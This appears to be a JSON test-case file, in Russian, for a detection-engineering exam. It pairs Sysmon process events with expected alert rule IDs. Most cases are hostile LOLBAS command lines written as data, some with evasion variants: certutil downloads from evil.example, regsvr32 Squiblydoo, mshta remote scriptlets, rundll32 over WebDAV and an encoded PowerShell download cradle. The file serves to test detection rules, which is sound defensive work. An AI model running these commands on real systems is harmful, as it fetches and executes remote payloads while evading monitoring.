@@ -1,0 +1,392 @@
+{
+  "name": "l2_detection_exam_suite",
+  "description": "Юнит-кейсы экзамена L2 (Detection Engineering): 10 сценариев подавления Alert Fatigue (7 легитимный шум + 3 blind-spot — шум подавляется, подозрительный админ-инструмент нет), 15 детектов LOLBAS (certutil/rundll32/mshta/regsvr32) и 5 evasion/edge-кейсов.",
+  "default_location": "Microsoft-Windows-Sysmon/Operational",
+  "default_log_format": "json",
+  "session_mode": "per_test",
+  "tests": [
+    {
+      "name": "подавление 1/7: SCCM CcmExec запускает powershell",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"commandLine\":\"powershell.exe -NoProfile -Command \\\"Get-CimInstance Win32_OperatingSystem\\\"\",\"parentImage\":\"C:\\\\Windows\\\\CCM\\\\CcmExec.exe\",\"parentCommandLine\":\"\\\"C:\\\\Windows\\\\CCM\\\\CcmExec.exe\\\" -service -redirectWindowsUpdateLog\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 2/7: Veeam Agent запускает cmd",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"commandLine\":\"cmd.exe /c \\\"C:\\\\Program Files\\\\Veeam\\\\Backup\\\\veeamconfig.exe\\\" session list\",\"parentImage\":\"C:\\\\Program Files\\\\Veeam\\\\Backup\\\\VeeamAgent.exe\",\"parentCommandLine\":\"\\\"C:\\\\Program Files\\\\Veeam\\\\Backup\\\\VeeamAgent.exe\\\" -runjob DailyBackup\",\"user\":\"SEVENKINGDOMS\\\\backup_svc\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 3/7: Zabbix Agent запускает wmic",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\wmic.exe\",\"commandLine\":\"wmic.exe os get FreePhysicalMemory /Value\",\"parentImage\":\"C:\\\\Program Files\\\\Zabbix Agent\\\\zabbix_agentd.exe\",\"parentCommandLine\":\"\\\"C:\\\\Program Files\\\\Zabbix Agent\\\\zabbix_agentd.exe\\\" --config \\\"C:\\\\Program Files\\\\Zabbix Agent\\\\zabbix_agentd.conf\\\"\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 4/7: taskeng запускает health_check.ps1",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"commandLine\":\"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\\\Scripts\\\\Maintenance\\\\health_check.ps1\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\taskeng.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\System32\\\\taskeng.exe\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 5/7: explorer запускает cmd с shell32 Control_RunDLL",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"commandLine\":\"cmd.exe /c rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 6/7: certutil -pulse из-под службы CertPropSvc",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"commandLine\":\"cmd.exe /c certutil.exe -pulse\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs -p -s CertPropSvc\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "подавление 7/7: certutil -verifyctl через WinRM",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"commandLine\":\"cmd.exe /c certutil.exe -verifyctl -f \\\"C:\\\\Windows\\\\Temp\\\\certs\\\\ca.cer\\\"\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\winrshost.exe\",\"parentCommandLine\":\"winrshost.exe\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "alert": false
+      },
+      "category": "suppression",
+      "attack": false,
+      "evasion": false,
+      "expected_rule_id": null,
+      "mitre_id": null
+    },
+    {
+      "name": "blind-spot 1/3: powershell -EncodedCommand от процесса из C:\\Users\\Public",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"commandLine\":\"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTAuMTAvYS5wczEnKQ==\",\"parentImage\":\"C:\\\\Users\\\\Public\\\\suspicious.exe\",\"parentCommandLine\":\"C:\\\\Users\\\\Public\\\\suspicious.exe\",\"user\":\"C:\\\\Users\\\\Public\\\\suspicious.exe\"}}}",
+      "expect": {
+        "rule.id": "100250",
+        "alert": true
+      },
+      "category": "suppression",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100250",
+      "mitre_id": null
+    },
+    {
+      "name": "blind-spot 2/3: wmic process call create от процесса из AppData Temp",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\wmic.exe\",\"commandLine\":\"wmic.exe process call create \\\"cmd.exe /c whoami\\\"\",\"parentImage\":\"C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\installer.exe\",\"parentCommandLine\":\"C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\installer.exe /silent\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100250",
+        "alert": true
+      },
+      "category": "suppression",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100250",
+      "mitre_id": null
+    },
+    {
+      "name": "blind-spot 3/3: cmd от services.exe",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"commandLine\":\"cmd.exe /c whoami /all\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\services.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\System32\\\\services.exe\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "rule.id": "100250",
+        "alert": true
+      },
+      "category": "suppression",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100250",
+      "mitre_id": null
+    },
+    {
+      "name": "LOLBAS certutil 1/4: загрузка через -urlcache -f в Public",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -f http://10.10.10.10/payload.exe C:\\\\Users\\\\Public\\\\payload.exe\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -f http://10.10.10.10/payload.exe\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1105"
+    },
+    {
+      "name": "LOLBAS certutil 2/4: загрузка через -urlcache -split -f в ProgramData",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f https://evil.example/beacon.dll C:\\\\ProgramData\\\\beacon.dll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentCommandLine\":\"powershell.exe -NoProfile -Command \\\"certutil.exe -urlcache -split -f https://evil.example/beacon.dll\\\"\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1105"
+    },
+    {
+      "name": "LOLBAS certutil 3/4: декодирование -decode в Temp",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -decode C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\payload.b64 C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -decode C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\payload.b64\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1140"
+    },
+    {
+      "name": "LOLBAS certutil 4/4: декодирование -decodehex в Temp",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -decodehex C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\stage.hex C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\stage.bin\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -decodehex C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\stage.hex\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1140"
+    },
+    {
+      "name": "LOLBAS rundll32 1/4: DLL из Public",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\payload.dll,EntryPoint\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\payload.dll,EntryPoint\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    },
+    {
+      "name": "LOLBAS rundll32 2/4: кавычки, DLL из AppData Temp",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\update.dll\\\",Start\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe \\\"C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\update.dll\\\",Start\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    },
+    {
+      "name": "LOLBAS rundll32 3/4: скрытое расширение .dat",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\payload.dat,RunDll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\payload.dat,RunDll\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    },
+    {
+      "name": "LOLBAS rundll32 4/4: DLL из Windows Temp",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\Temp\\\\stage.dll,Main\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Windows\\\\Temp\\\\stage.dll,Main\",\"user\":\"NT AUTHORITY\\\\SYSTEM\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    },
+    {
+      "name": "LOLBAS mshta 1/4: HTA по HTTPS",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe https://evil.example/payload.hta\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe https://evil.example/payload.hta\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100803",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100803",
+      "mitre_id": "T1218.005"
+    },
+    {
+      "name": "LOLBAS mshta 2/4: HTA по HTTP",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe http://10.10.10.10/a.hta\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\winrshost.exe\",\"parentCommandLine\":\"winrshost.exe\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100803",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100803",
+      "mitre_id": "T1218.005"
+    },
+    {
+      "name": "LOLBAS mshta 3/4: inline vbscript",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe vbscript:Close(Execute(\\\"GetObject(\\\"\\\"script:http://evil.example/x.sct\\\"\\\")\\\"))\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe vbscript:Close(Execute())\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100803",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100803",
+      "mitre_id": "T1218.005"
+    },
+    {
+      "name": "LOLBAS mshta 4/4: inline javascript",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe javascript:a=GetObject(\\\"script:http://evil.example/p.sct\\\");a.Exec();close()\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe javascript:a=GetObject()\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100803",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100803",
+      "mitre_id": "T1218.005"
+    },
+    {
+      "name": "LOLBAS regsvr32 1/3: Squiblydoo по HTTP",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /u /i:http://evil.example/payload.sct scrobj.dll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /u /i:http://evil.example/payload.sct scrobj.dll\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100804",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100804",
+      "mitre_id": "T1218.010"
+    },
+    {
+      "name": "LOLBAS regsvr32 2/3: SCT из профиля пользователя",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /i:C:\\\\Users\\\\Public\\\\payload.sct scrobj.dll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /i:C:\\\\Users\\\\Public\\\\payload.sct scrobj.dll\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100804",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100804",
+      "mitre_id": "T1218.010"
+    },
+    {
+      "name": "LOLBAS regsvr32 3/3: Squiblydoo по HTTPS",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /n /u /i:https://evil.example/x.sct scrobj.dll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentCommandLine\":\"powershell.exe -NoProfile -Command \\\"regsvr32.exe /n /u /i:https://evil.example/x.sct scrobj.dll\\\"\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100804",
+        "alert": true
+      },
+      "category": "lolbas",
+      "attack": true,
+      "evasion": false,
+      "expected_rule_id": "100804",
+      "mitre_id": "T1218.010"
+    },
+    {
+      "name": "evasion 1/5: certutil со смешанным регистром",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\cErTuTiL.eXe\",\"commandLine\":\"cErTuTiL.eXe -URLcache -f https://evil.example/tool.exe C:\\\\Users\\\\Public\\\\tool.exe\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c cErTuTiL.eXe -URLcache -f https://evil.example/tool.exe\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "evasion",
+      "attack": true,
+      "evasion": true,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1105"
+    },
+    {
+      "name": "evasion 2/5: regsvr32 с кавычками и лишними пробелами",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe   /i:\\\"https://evil.example/x.sct\\\"    \\\"scrobj.dll\\\"\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /i:https://evil.example/x.sct scrobj.dll\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100804",
+        "alert": true
+      },
+      "category": "evasion",
+      "attack": true,
+      "evasion": true,
+      "expected_rule_id": "100804",
+      "mitre_id": "T1218.010"
+    },
+    {
+      "name": "evasion 3/5: относительный путь ..\\..\\certutil.exe",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"..\\\\..\\\\certutil.exe\",\"commandLine\":\"..\\\\..\\\\certutil.exe -decode C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\x.b64 C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\x.dll\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c ..\\\\..\\\\certutil.exe -decode C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\x.b64\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100801",
+        "alert": true
+      },
+      "category": "evasion",
+      "attack": true,
+      "evasion": true,
+      "expected_rule_id": "100801",
+      "mitre_id": "T1140"
+    },
+    {
+      "name": "evasion 4/5: rundll32 с UNC/WebDAV",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\\\\\\evil.com@80\\\\webdav\\\\test.dll,Entry\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe \\\\\\\\evil.com@80\\\\webdav\\\\test.dll,Entry\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "evasion",
+      "attack": true,
+      "evasion": true,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    },
+    {
+      "name": "evasion 5/5: rundll32 с ординалом и скрытым расширением",
+      "event": "{\"win\":{\"system\":{\"eventID\":\"1\"},\"eventdata\":{\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\payload.dat,#1\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\bob\\\\AppData\\\\Local\\\\Temp\\\\payload.dat,#1\",\"user\":\"SEVENKINGDOMS\\\\Administrator\"}}}",
+      "expect": {
+        "rule.id": "100802",
+        "alert": true
+      },
+      "category": "evasion",
+      "attack": true,
+      "evasion": true,
+      "expected_rule_id": "100802",
+      "mitre_id": "T1218.011"
+    }
+  ]
+}
